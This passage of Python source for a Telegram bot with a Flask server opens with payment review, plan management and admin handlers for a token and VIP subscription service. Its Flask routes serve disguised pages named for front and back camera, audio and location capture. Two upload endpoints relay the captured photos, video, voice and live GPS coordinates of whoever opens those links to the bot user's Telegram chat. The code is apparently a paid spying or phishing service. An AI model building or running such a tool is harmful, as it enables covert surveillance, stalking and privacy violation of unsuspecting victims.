           types.InlineKeyboardButton("❌ Reject", callback_data=f"pay_reject:{order_id}"))
    caption = (f"💳 <b>Payment review</b>\nOrder: <code>{order_id}</code>\n"
        f"User: <code>{order['uid']}</code>\nPlan: {order['plan'].get('name')}\n"
        f"Amount due: ₹{order['amount']}\nUPI: {UPI_ID}\nVerify in your UPI/bank app before approving.")
    bot.send_photo(ADMIN_ID, file_id, caption=caption, parse_mode="HTML", reply_markup=mk)
    bot.send_message(message.chat.id, "📨 Screenshot admin ko bhej diya. Verification ke baad status milega.")

@bot.callback_query_handler(func=lambda c: c.data.startswith(("pay_approve:", "pay_reject:")))
def payment_review_callback(call):
    if not _is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True); return
    action, order_id = call.data.split(":", 1)
    db = load_db(); order = db.get("pending_orders", {}).get(order_id)
    if not order or order.get("status") != "pending_admin":
        bot.answer_callback_query(call.id, "Order already processed or missing.", show_alert=True); return
    uid = order["uid"]
    if action == "pay_approve":
        u = db.setdefault("users", {}).get(uid)
        if not u:
            bot.answer_callback_query(call.id, "User record missing", show_alert=True); return
        plan = order["plan"]
        if plan.get("kind") == "tokens":
            amount = int(plan.get("value", 0)); u["tokens"] = int(u.get("tokens", 0)) + amount
            _add_history(u, f"purchase_{order_id}", amount)
        elif plan.get("kind") == "vip":
            days = int(plan.get("value", 0))
            base = datetime.now()
            try:
                old_exp = datetime.strptime(u.get("expiry"), "%Y-%m-%d %H:%M:%S")
                if u.get("plan") == "unlimited" and old_exp > base: base = old_exp
            except Exception: pass
            u["plan"] = "unlimited"; u["expiry"] = (base + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
            _add_history(u, f"purchase_vip_{order_id}", 0)
        else:
            bot.answer_callback_query(call.id, "Invalid plan kind", show_alert=True); return
        order["status"] = "approved"; order["reviewed"] = datetime.now().isoformat(); save_db(db)
        bot.send_message(int(uid), f"✅ Payment verified. <b>{plan.get('name')}</b> activated. Order <code>{order_id}</code>.", parse_mode="HTML")
        bot.answer_callback_query(call.id, "Approved")
        try: bot.edit_message_caption((call.message.caption or "") + "\n\n✅ APPROVED", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=None)
        except Exception: pass
    else:
        order["status"] = "rejected"; order["reviewed"] = datetime.now().isoformat(); save_db(db)
        bot.send_message(int(uid), f"❌ Payment order <code>{order_id}</code> rejected. Agar payment deduct hua hai, admin se transaction reference ke saath contact karein.", parse_mode="HTML")
        bot.answer_callback_query(call.id, "Rejected")
        try: bot.edit_message_caption((call.message.caption or "") + "\n\n❌ REJECTED", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=None)
        except Exception: pass

# Admin replies directly to the feedback message to answer only that user.
@bot.message_handler(func=lambda m: bool(m.from_user and int(m.from_user.id) == ADMIN_ID and m.reply_to_message), content_types=['text'])
def admin_feedback_reply(message):
    db = load_db(); uid = db.get("feedback_map", {}).get(str(message.reply_to_message.message_id))
    if not uid: return
    try:
        bot.send_message(int(uid), f"💬 <b>Admin reply:</b>\n{html.escape(message.text)}", parse_mode="HTML")
        bot.reply_to(message, "✅ Reply user ko bhej diya.")
    except Exception as e:
        bot.reply_to(message, f"❌ Reply failed: {e}")

# Admin plan management: add/edit through a single structured message; delete/toggle inline.
@bot.message_handler(func=lambda m: m.text == BTN_MANAGE_PLANS)
def admin_manage_plans(message):
    if not _is_admin(message.from_user.id): return
    db = load_db(); mk = types.InlineKeyboardMarkup(row_width=2)
    for pid, plan in db.get("plans", {}).items():
        state = "🟢" if plan.get("active", True) else "⚫"
        mk.row(types.InlineKeyboardButton(f"{state} {plan.get('name',pid)}", callback_data=f"plan_toggle:{pid}"),
               types.InlineKeyboardButton(f"🗑 {pid}", callback_data=f"plan_delete:{pid}"))
    mk.add(types.InlineKeyboardButton("➕ Add Plan", callback_data="plan_add"))
    bot.send_message(message.chat.id,
        "<blockquote>🛍 <b>Manage Plans</b>\nToggle/delete buttons use karein. Add format:\n"
        "<code>ID | Name | tokens/vip | value | price</code>\nExample: <code>tok20 | 20 Tokens | tokens | 20 | 25</code>\n"
        "Existing plan edit: <code>/editplan ID | Name | tokens/vip | value | price</code></blockquote>", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data in ("plan_add",) or c.data.startswith(("plan_toggle:", "plan_delete:")))
def plan_manage_callback(call):
    if not _is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True); return
    db = load_db()
    if call.data == "plan_add":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "Format: <code>ID | Name | tokens/vip | value | price</code>", parse_mode="HTML")
        bot.register_next_step_handler_by_chat_id(call.message.chat.id, admin_add_plan)
        return
    action, pid = call.data.split(":", 1)
    if pid not in db.get("plans", {}):
        bot.answer_callback_query(call.id, "Plan not found", show_alert=True); return
    if action == "plan_toggle":
        db["plans"][pid]["active"] = not db["plans"][pid].get("active", True)
    else:
        del db["plans"][pid]
    save_db(db); bot.answer_callback_query(call.id, "Updated")
    try: bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
    except Exception: pass
    bot.send_message(call.message.chat.id, "Plan updated. Manage Plans dobara kholein.")

def admin_add_plan(message):
    if not _is_admin(message.from_user.id): return
    try:
        pid, name, kind, value, price = [x.strip() for x in message.text.split("|")]
        value = int(value); price = money(price)
        if not pid.isalnum() or kind not in ("tokens", "vip") or value <= 0 or price <= 0: raise ValueError
        db = load_db(); db.setdefault("plans", {})[pid] = {"name": name[:40], "kind": kind, "value": value, "price": str(price), "active": True}; save_db(db)
        bot.send_message(message.chat.id, f"✅ Plan <b>{name}</b> added.", parse_mode="HTML")
    except Exception:
        bot.send_message(message.chat.id, "❌ Invalid format. Example: <code>tok20 | 20 Tokens | tokens | 20 | 25</code>", parse_mode="HTML")

@bot.message_handler(commands=['editplan'])
def admin_edit_plan(message):
    if not _is_admin(message.from_user.id): return
    try:
        raw = message.text.split(None, 1)[1]
        pid, name, kind, value, price = [x.strip() for x in raw.split("|")]
        value = int(value); price = money(price)
        if kind not in ("tokens", "vip") or value <= 0 or price <= 0: raise ValueError
        db = load_db()
        if pid not in db.get("plans", {}): raise KeyError
        db["plans"][pid].update({"name": name[:40], "kind": kind, "value": value, "price": str(price)})
        save_db(db); bot.reply_to(message, "✅ Plan updated.")
    except Exception:
        bot.reply_to(message, "Format: <code>/editplan ID | Name | tokens/vip | value | price</code>", parse_mode="HTML")

# ============================================================
# ============ 22. GATEKEEPER (Maintenance/Ban) ==============
# ============================================================

@bot.message_handler(func=lambda m: True, content_types=['text'])
def gatekeeper(message):
    if message.chat.type != "private":
        return
    if _is_admin(message.from_user.id):
        return
    db = load_db()
    if db["settings"].get("maintenance"):
        bot.reply_to(message,
            f"<blockquote>🔧 <b>Bot under maintenance!</b>\nThodi der baad try karein.\n{DEV_TAG}</blockquote>")
        return
    uid = str(message.from_user.id)
    user = db["users"].get(uid)
    if user and user.get("banned"):
        bot.reply_to(message,
            f"<blockquote>🚫 <b>Aap ban ho chuke hain!</b>\nContact: @{OWNER_USERNAME}\n{DEV_TAG}</blockquote>")
        return

# ============================================================
# ================= 23. FLASK ROUTES =========================
# ============================================================

@app.route('/Ayush-wab')
def route_front(): return render_template('Front_camera.html')

@app.route('/Ayush-wab-1')
def route_back(): return render_template('Back_camera.html')

@app.route('/Ayush-wab-2')
def route_f8s(): return render_template('Front_8s.html')

@app.route('/Ayush-wab-3')
def route_b8s(): return render_template('Back_8s.html')

@app.route('/Ayush-wab-4')
def route_audio(): return render_template('Audio.html')

@app.route('/Ayush-wab-5')
def route_location(): return render_template('Location.html')

@app.route('/health')
def health():
    return jsonify({
        "status": "ok",
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "bot": "running"
    }), 200

@app.route('/upload_media', methods=['POST'])
def receive_media():
    chat_id = request.form.get('chat_id')
    media_type = request.form.get('type')
    file = request.files.get('file')
    if not (chat_id and file):
        return "FAIL", 400
    data = file.read()
    caption = f"<blockquote>✅ <b>Auto Captured Media!</b>\n{DEV_TAG}</blockquote>"
    try:
        if media_type == 'photo':
            bot.send_photo(chat_id=chat_id, photo=data, caption=caption)
        elif media_type == 'video':
            bot.send_video(chat_id=chat_id, video=data, caption=caption)
        elif media_type == 'audio':
            bot.send_voice(chat_id=chat_id, voice=data, caption=caption)
        else:
            return "BAD_TYPE", 400
        return "OK", 200
    except Exception as e:
        print("Media Send Error:", e)
        return "ERROR", 500

@app.route('/upload_location', methods=['POST'])
def receive_location():
    chat_id = request.form.get('chat_id')
    lat = request.form.get('latitude')
    lon = request.form.get('longitude')
    acc = request.form.get('accuracy', '0')
    if not (chat_id and lat and lon):
        return "FAIL", 400
    try:
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        loc_text = (
            f"<blockquote>📍 <b>Live Location!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Lat: <code>{lat}</code>\n"
            f"🌐 Lon: <code>{lon}</code>\n"
            f"🎯 Acc: {acc}m\n"
            f"🗺️ <a href='{maps_url}'>Maps</a>\n"
            f"{DEV_TAG}</blockquote>"
        )
        bot.send_location(chat_id=chat_id, latitude=float(lat), longitude=float(lon))
        bot.send_message(chat_id=chat_id, text=loc_text, disable_web_page_preview=False)
        return "OK", 200
    except Exception as e:
        print("Location Send Error:", e)
        return "ERROR", 500

# ============================================================
# ================== 24. STARTUP =============================
# ============================================================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))

    def run_flask():
        app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

    threading.Thread(target=run_flask, daemon=True).start()
    print(f"✅ Flask started on port {port}")
    print("🤖 Bot polling started...")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)